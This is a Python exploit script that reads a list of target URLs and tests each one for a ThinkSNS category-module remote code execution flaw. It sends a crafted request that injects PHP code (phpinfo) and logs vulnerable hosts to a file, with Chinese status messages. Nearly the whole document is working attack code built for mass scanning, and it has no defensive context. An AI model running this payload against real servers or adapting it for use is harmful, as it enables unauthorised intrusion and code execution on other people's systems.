
import json
import requests



urls = open('url.txt')

poc = '/action/usermanager.htm'

for i in urls:
    url = i.rstrip("\n")
    payload = "/index.php?app=widget&mod=Category&act=getChild&model_name=Schedule&method=runSchedule&id%5Btask_to_run%5D=addons/Area)->getAreaList();phpinfo();%23"
    vulnurl = url + payload
    try:
        req = requests.get(vulnurl,  timeout=10, verify=False)
        if r"Configuration File (php.ini) Path" in req.text:
           print("[+]存在thinksns category模块代码执行漏洞...(高危)\tpayload: " + vulnurl, "red")
           with open('漏洞.txt', 'a')as f:
               f.write(str(vulnurl) + '\n')
        else:
           print("[-]不存在thinksns_category_code_exec漏洞", "white", "on_grey")

    except:
       print("[-] " + __file__ + "====>可能不存在漏洞", "cyan")